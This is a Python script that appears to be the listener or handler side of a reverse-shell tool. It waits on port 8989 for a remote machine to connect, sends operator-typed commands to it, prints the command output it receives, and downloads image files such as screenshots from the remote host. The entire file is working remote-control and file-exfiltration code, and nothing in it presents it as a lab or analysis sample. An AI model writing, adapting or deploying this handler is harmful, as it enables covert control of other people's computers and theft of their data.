import socket
import os
hostname = socket.gethostname()
## getting the IP address using socket.gethostbyname() method
hostname=socket.gethostname()
HOST=socket.gethostbyname(hostname)         #"192.168.116.145"       #socket.gethostbyname(hostname)  # Standard loopback interface address (localhost)\
#"192.168.83.145"
#"192.168.116.145"
PORT = 8989# Port to listen on (non-privileged ports are > 1023)
size=1034  #1024
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()
    conn, addr = s.accept()
    with conn:
        print(f"Connected by {addr}")
        while True:
            inp=input('Enter_Command:').strip().encode()#take input
            conn.send(inp)#send_input
            if inp.decode()=="end" or inp.decode()=="exit" or inp.decode()=="close":
                print("[-]Connection ended...")
                conn.close()
                exit()
                
                
            elif inp.decode().endswith('.jpg') or inp.decode().endswith('.png') or inp.decode().endswith('.ico'):
                data = conn.recv(size).decode()#recieve_input
                data=data.split('*')#get the filename and filesize
                filename,filesize=data[0],data[1]# declare it to variable
                print(filename,filesize)
                with open(filename,'wb') as f:
                #with tqdm.wrapattr(open(filename,'wb'), "write", total=int(filesize),desc=filename,colour="green") as f:
                    print('[-]receiving..')
                    while True:
                        content=conn.recv(32)
                        if content==b'BEGIN':
                            continue
                        elif content==b'ENDED':
                            print('[*]Breaking_from_file_write')
                            break
                        else:
                            f.write(content)
                    print("[+]Received..") 
                print(os.path.getsize(filename))
                print("[+]Done..")
                
                
            else:
                data = conn.recv(size).decode()#recieve_input
                data=data.split('*')#get the filename and filesize
                filename,filesize=data[0],data[1]# declare it to variable
                print(f'[+]Command={filename} size:={filesize}')
                output=conn.recv(int(filesize))#recieve all data
                print(output.decode())#print the output you get
                